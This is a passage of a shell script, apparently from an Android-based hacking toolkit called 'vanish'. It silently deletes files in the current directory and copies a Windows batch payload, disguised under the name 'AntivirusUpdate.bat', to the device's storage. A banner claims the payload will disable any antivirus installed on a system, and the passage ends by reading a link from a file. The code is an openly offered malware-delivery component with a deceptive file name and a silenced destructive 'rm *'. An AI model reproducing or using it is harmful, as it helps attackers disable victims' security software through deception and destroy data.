...
rm * >/dev/null 2>&1
cd $HOME
cp $HOME/vanish/core/src/windows/AntivirusUpdate.bat /sdcard/vanrc >/dev/null 2>&1
clear
echo -e "\e[91m 
  ┌─┐┌┐┌┌┬┐┬┬  ┬┬┬─┐┬ ┬┌─┐  ┌┬┐┬┌─┐┌─┐┌┐ ┬  ┌─┐
  ├─┤│││ │ │└┐┌┘│├┬┘│ │└─┐   │││└─┐├─┤├┴┐│  ├┤ 
...
"
echo
echo -e "         \e[91m[\e[0mThis large code will disable any 
          antivirus installed on the system.\e[91m]\e[0m"
cd $HOME/vanish/core/src/windows
link=$(cat antivirusdisable)
